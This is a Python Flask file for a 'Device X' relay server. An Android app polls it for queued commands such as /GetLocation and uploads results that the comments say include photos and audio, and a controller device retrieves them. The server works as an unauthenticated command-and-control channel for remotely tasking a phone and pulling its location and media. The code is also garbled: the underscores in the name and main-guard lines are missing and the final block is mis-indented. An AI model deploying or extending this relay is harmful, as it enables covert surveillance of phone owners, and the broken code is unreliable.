from flask import Flask, request, jsonify
import time

app = Flask(name)

# In-Memory Stores (RAM Only - No Database)
# Structure: { "ANDROID_ID": { "command": "/GetLocation", "timestamp": 12345678 } }
pending_commands = {}

# Structure: { "ANDROID_ID": { "cmd": "/GetLocation", "result": "Map Link...", "timestamp": 12345678 } }
device_results = {}

# Structure: { "ANDROID_ID": "2026-09-20 23:40:00" }
active_devices = {}


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "status": "online",
        "system": "Device X Automation Relay Server",
        "active_devices_count": len(active_devices)
    }), 200


# ==========================================
# 1. ANDROID APP ENDPOINTS (Device X)
# ==========================================

@app.route("/get-command", methods=["GET"])
def get_command():
    """
    Android App (Device X) polls this every 5 seconds.
    Query Params: ?device_id=ANDROID_9A8B7C6D
    """
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id is required"}), 400

    # Update device heartbeat
    active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")

    # Check if there is a pending command for this specific device
    if device_id in pending_commands and pending_commands[device_id]:
        command_data = pending_commands.pop(device_id)  # Remove command once retrieved (Single execution)
        return jsonify(command_data), 200

    return jsonify({"cmd": None}), 200


@app.route("/post-result", methods=["POST"])
def post_result():
    """
    Android App posts execution results/photos/audio back here.
    Payload: {"device_id": "...", "cmd": "...", "result": "..."}
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON payload"}), 400

    device_id = data.get("device_id")
    cmd = data.get("cmd")
    result = data.get("result")

    if not device_id or not cmd:
        return jsonify({"error": "Missing device_id or cmd"}), 400

    # Store result in RAM for Device Y to fetch
    device_results[device_id] = {
        "cmd": cmd,
        "result": result,
        "timestamp": time.time()
    }

    # Update active status
    active_devices[device_id] = time.strftime("%Y-%m-%d %H:%M:%S")

    return jsonify({"status": "success"}), 200


# ==========================================
# 2. DASHBOARD / CONTROLLER ENDPOINTS (Device Y)
# ==========================================

@app.route("/send-command", methods=["POST"])
def send_command():
    """
    Device Y / Dashboard posts a new command targeted to a specific device.
    Payload: {"device_id": "ANDROID_9A8B7C6D", "cmd": "/GetLocation"}
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON payload"}), 400

    device_id = data.get("device_id")
    cmd = data.get("cmd")

    if not device_id or not cmd:
        return jsonify({"error": "Missing target device_id or cmd"}), 400

    # Set command in RAM queue for this device
    pending_commands[device_id] = {
        "cmd": cmd,
        "timestamp": time.time()
    }

    return jsonify({
        "status": "queued",
        "target_device": device_id,
        "command": cmd
    }), 200


@app.route("/get-result", methods=["GET"])
def get_result():
    """
    Device Y fetches the latest execution result from Device X.
    Query Params: ?device_id=ANDROID_9A8B7C6D
    """
    device_id = request.args.get("device_id")
    if not device_id:
        return jsonify({"error": "device_id parameter required"}), 400

    if device_id in device_results:
        result_data = device_results.pop(device_id)  # Clear from RAM once fetched
        return jsonify(result_data), 200

    return jsonify({"status": "no_data_yet"}), 200


@app.route("/list-devices", methods=["GET"])
def list_devices():
    """
    Returns list of all active Android devices that polled the server recently.
    """
    return jsonify({
        "active_devices": active_devices
    }), 200
    __if name == "main":
    app.run(host="0.0.0.0", port=5000)
